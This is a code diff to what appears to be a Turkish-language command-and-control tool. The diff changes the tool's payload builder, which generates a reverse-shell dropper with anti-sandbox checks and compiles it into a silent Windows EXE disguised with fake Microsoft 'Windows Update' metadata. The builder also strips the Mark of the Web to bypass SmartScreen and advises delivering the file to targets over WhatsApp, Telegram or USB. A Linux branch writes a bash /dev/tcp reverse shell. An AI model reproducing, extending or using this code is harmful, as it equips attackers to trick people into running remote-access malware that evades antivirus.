@@ -329,22 +329,23 @@ def c2_payload_builder(auto_lhost=None, auto_lport=None, auto_os=None, auto_anti
         return
 
     if os_choice == '1':
-        print(f"\n{C.YELLOW}  [*] Payload oluşturuluyor...{C.RESET}")
-        import sys
-        sys.stdout.flush()
-        
-        aes_key = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
-        save_text("c2_aes_key.txt", aes_key)
-        print(f"{C.GREEN}  [+] AES-256 Anahtarı Üretildi ve Kaydedildi.{C.RESET}")
+        try:
+            print(f"\n{C.YELLOW}  [*] Payload oluşturuluyor... Lütfen bekleyin.{C.RESET}")
+            import sys
+            sys.stdout.flush()
+            
+            aes_key = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
+            save_text("c2_aes_key.txt", aes_key)
+            print(f"{C.GREEN}  [+] AES-256 Anahtarı Üretildi ve Kaydedildi.{C.RESET}")
 
-        # Reverse shell Python scripti oluştur
-        output_dir = "stealth_dropper"
-        os.makedirs(output_dir, exist_ok=True)
-        stub_path = os.path.join(output_dir, "_stub.py")
+            # Reverse shell Python scripti oluştur
+            output_dir = "stealth_dropper"
+            os.makedirs(output_dir, exist_ok=True)
+            stub_path = os.path.join(output_dir, "_stub.py")
 
-        anti_sb_code = ""
-        if anti_sb:
-            anti_sb_code = """
+            anti_sb_code = ""
+            if anti_sb:
+                anti_sb_code = """
 import ctypes, time
 # Zamanlama kontrolü
 t1 = time.time()
@@ -372,93 +373,105 @@ except:
     pass
 """
 
-        # Stub template'den oku ve placeholder'lari degistir
-        template_path = os.path.join(os.path.dirname(__file__), "stealth_dropper", "stub_template.py")
-        with open(template_path, "r", encoding="utf-8") as tf:
-            stub_code = tf.read()
-        stub_code = stub_code.replace("__LHOST__", lhost)
-        stub_code = stub_code.replace("__LPORT__", str(lport))
-        stub_code = stub_code.replace("__ANTI_SB__", anti_sb_code)
-        stub_code = stub_code.replace("__AES_KEY__", aes_key)
-        save_text(stub_path, stub_code)
+            # Stub template'den oku ve placeholder'lari degistir
+            template_path = os.path.join(os.path.dirname(__file__), "stealth_dropper", "stub_template.py")
+            if not os.path.exists(template_path):
+                print(f"{C.RED}  [-] Hata: stub_template.py bulunamadı! Yol: {template_path}{C.RESET}")
+                input(f"{C.YELLOW}  Devam etmek için Enter'a basın...{C.RESET}")
+                return
 
-        print(f"{C.YELLOW}  [*] Nuitka ile native EXE derleniyor (bu biraz sürebilir)...{C.RESET}")
+            with open(template_path, "r", encoding="utf-8") as tf:
+                stub_code = tf.read()
+            stub_code = stub_code.replace("__LHOST__", lhost)
+            stub_code = stub_code.replace("__LPORT__", str(lport))
+            stub_code = stub_code.replace("__ANTI_SB__", anti_sb_code)
+            stub_code = stub_code.replace("__AES_KEY__", aes_key)
+            save_text(stub_path, stub_code)
 
-        # Nuitka ile derle (native C — AV tespiti çok düşük)
-        exe_out = os.path.join(output_dir, exe_name + ".exe")
-        result = subprocess.run(
-            [sys.executable, "-m", "nuitka",
-             "--onefile", "--windows-console-mode=disable",
-             "--output-dir=" + output_dir,
-             "--output-filename=" + exe_name + ".exe",
-             "--remove-output",
-             "--assume-yes-for-downloads",
-             "--windows-company-name=Microsoft Corporation",
-             "--windows-product-name=Windows Update Service",
-             "--windows-file-version=10.0.26200.1",
-             "--windows-product-version=10.0.26200.1",
-             "--windows-file-description=Windows Update Assistant",
-             stub_path],
-            capture_output=True, text=True
-        )
+            print(f"{C.YELLOW}  [*] Nuitka ile native EXE derleniyor (bu işlem 1-5 dakika sürebilir)...{C.RESET}")
 
-        # Temizlik
-        for cleanup in [stub_path,
-                        os.path.join(output_dir, "_stub.build"),
-                        os.path.join(output_dir, "_stub.onefile-build"),
-                        os.path.join(output_dir, "_stub.dist")]:
-            if cleanup and os.path.exists(cleanup):
+            # Nuitka ile derle (native C — AV tespiti çok düşük)
+            exe_out = os.path.join(output_dir, exe_name + ".exe")
+            result = subprocess.run(
+                [sys.executable, "-m", "nuitka",
+                 "--onefile", "--windows-console-mode=disable",
+                 "--output-dir=" + output_dir,
+                 "--output-filename=" + exe_name + ".exe",
+                 "--remove-output",
+                 "--assume-yes-for-downloads",
+                 "--windows-company-name=Microsoft Corporation",
+                 "--windows-product-name=Windows Update Service",
+                 "--windows-file-version=10.0.26200.1",
+                 "--windows-product-version=10.0.26200.1",
+                 "--windows-file-description=Windows Update Assistant",
+                 stub_path],
+                capture_output=True, text=True
+            )
+
+            # Temizlik
+            for cleanup in [stub_path,
+                            os.path.join(output_dir, "_stub.build"),
+                            os.path.join(output_dir, "_stub.onefile-build"),
+                            os.path.join(output_dir, "_stub.dist")]:
+                if cleanup and os.path.exists(cleanup):
+                    try:
+                        if os.path.isdir(cleanup):
+                            shutil.rmtree(cleanup, ignore_errors=True)
+                        else:
+                            os.remove(cleanup)
+                    except:
+                        pass
+
+            if os.path.exists(exe_out):
+                # MOTW (Mark of the Web) sil — SmartScreen bypass
                 try:
-                    if os.path.isdir(cleanup):
-                        shutil.rmtree(cleanup, ignore_errors=True)
-                    else:
-                        os.remove(cleanup)
-                except:
-                    pass
+                    motw_path = exe_out + ':Zone.Identifier'
+                    if os.path.exists(motw_path):
+                        os.remove(motw_path)
+                except: pass
+                # PowerShell ile de temizle
+                subprocess.run(['powershell', '-c',
+                    f'Remove-Item -Path "{os.path.abspath(exe_out)}" -Stream Zone.Identifier -ErrorAction SilentlyContinue'],
+                    capture_output=True)
 
-        if os.path.exists(exe_out):
-            # MOTW (Mark of the Web) sil — SmartScreen bypass
-            try:
-                motw_path = exe_out + ':Zone.Identifier'
-                if os.path.exists(motw_path):
-                    os.remove(motw_path)
-            except: pass
-            # PowerShell ile de temizle
-            subprocess.run(['powershell', '-c',
-                f'Remove-Item -Path "{os.path.abspath(exe_out)}" -Stream Zone.Identifier -ErrorAction SilentlyContinue'],
-                capture_output=True)
+                exe_size = os.path.getsize(exe_out) / (1024*1024)
+                print(f"\n{C.GREEN}{C.BOLD}  ╔══════════════════════════════════════════════════════╗{C.RESET}")
+                print(f"{C.GREEN}{C.BOLD}  ║  ✅ TEK DOSYA EXE PAYLOAD HAZIR!                     ║{C.RESET}")
+                print(f"{C.GREEN}{C.BOLD}  ╚══════════════════════════════════════════════════════╝{C.RESET}")
+                print(f"\n{C.WHITE}  📁 Dosya   : {os.path.abspath(exe_out)}{C.RESET}")
+                print(f"{C.WHITE}  📦 Boyut   : {exe_size:.1f} MB{C.RESET}")
+                print(f"{C.WHITE}  🛡️  Anti-SB : {'Açık' if anti_sb else 'Kapalı (Test Modu)'}{C.RESET}")
+                print(f"{C.WHITE}  🎯 Hedef   : {lhost}:{lport}{C.RESET}")
+                print(f"{C.WHITE}  🔧 Şifreleme: AES-256 E2E Encryption{C.RESET}")
+                print(f"{C.WHITE}  🛡️  MOTW    : Temizlendi ✅{C.RESET}")
+                print(f"\n{C.YELLOW}  [!] Bu EXE'yi hedefe gönderip çift tıklatmanız yeterli.{C.RESET}")
+                print(f"{C.YELLOW}  [!] SmartScreen bypass: WhatsApp/Telegram/USB ile gönderin.{C.RESET}")
+                print(f"{C.YELLOW}  [!] Listener'ınızı başlatmayı unutmayın: Menüden 2) Listener{C.RESET}")
 
-            exe_size = os.path.getsize(exe_out) / (1024*1024)
-            print(f"\n{C.GREEN}{C.BOLD}  ╔══════════════════════════════════════════════════════╗{C.RESET}")
-            print(f"{C.GREEN}{C.BOLD}  ║  ✅ TEK DOSYA EXE PAYLOAD HAZIR!                     ║{C.RESET}")
-            print(f"{C.GREEN}{C.BOLD}  ╚══════════════════════════════════════════════════════╝{C.RESET}")
-            print(f"\n{C.WHITE}  📁 Dosya   : {os.path.abspath(exe_out)}{C.RESET}")
-            print(f"{C.WHITE}  📦 Boyut   : {exe_size:.1f} MB{C.RESET}")
-            print(f"{C.WHITE}  🛡️  Anti-SB : {'Açık' if anti_sb else 'Kapalı (Test Modu)'}{C.RESET}")
-            print(f"{C.WHITE}  🎯 Hedef   : {lhost}:{lport}{C.RESET}")
-            print(f"{C.WHITE}  🔧 Şifreleme: AES-256 E2E Encryption{C.RESET}")
-            print(f"{C.WHITE}  🛡️  MOTW    : Temizlendi ✅{C.RESET}")
-            print(f"\n{C.YELLOW}  [!] Bu EXE'yi hedefe gönderip çift tıklatmanız yeterli.{C.RESET}")
-            print(f"{C.YELLOW}  [!] SmartScreen bypass: WhatsApp/Telegram/USB ile gönderin.{C.RESET}")
-            print(f"{C.YELLOW}  [!] Listener'ınızı başlatmayı unutmayın: Menüden 2) Listener{C.RESET}")
-
-            # Klasörü otomatik aç
-            if os.name == 'nt':
-                os.startfile(os.path.abspath(output_dir))
-        else:
-            print(f"\n{C.RED}  [-] EXE oluşturulamadı!{C.RESET}")
-            if result.stderr:
-                print(f"{C.RED}  [-] Hata: {result.stderr[:500]}{C.RESET}")
-            if result.stdout:
-                print(f"{C.DIM}  {result.stdout[-500:]}{C.RESET}")
-            print(f"{C.YELLOW}  [!] Nuitka kurulu mu? 'pip install nuitka' ile kurun.{C.RESET}")
+                # Klasörü otomatik aç
+                if os.name == 'nt':
+                    os.startfile(os.path.abspath(output_dir))
+            else:
+                print(f"\n{C.RED}  [-] EXE oluşturulamadı!{C.RESET}")
+                if result.stderr:
+                    print(f"{C.RED}  [-] Hata Çıktısı:\n{result.stderr}{C.RESET}")
+                if result.stdout:
+                    print(f"{C.DIM}  {result.stdout[-500:]}{C.RESET}")
+                print(f"{C.YELLOW}  [!] Lütfen 'pip install nuitka' komutunun çalıştığından emin olun.{C.RESET}")
+                input(f"\n{C.YELLOW}  Devam etmek için Enter'a basın...{C.RESET}")
+        except Exception as e:
+            print(f"\n{C.RED}  [!!!] KRİTİK HATA: {e}{C.RESET}")
+            import traceback
+            traceback.print_exc()
+            input(f"\n{C.YELLOW}  Hata detayı için Enter'a basın...{C.RESET}")
 
     elif os_choice == '2':
         payload = f"#!/bin/bash\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
         save_text("linux_payload.sh", payload)
         print(f"\n{C.GREEN}[+] Linux Payload oluşturuldu: linux_payload.sh{C.RESET}")
     
-    input(f"\n{C.YELLOW}  Ana menüye dönmek için Enter'a basın...{C.RESET}")
+    if not auto_exename:
+        input(f"\n{C.YELLOW}  Ana menüye dönmek için Enter'a basın...{C.RESET}")
 
 def c2_listener():
     clear_screen()
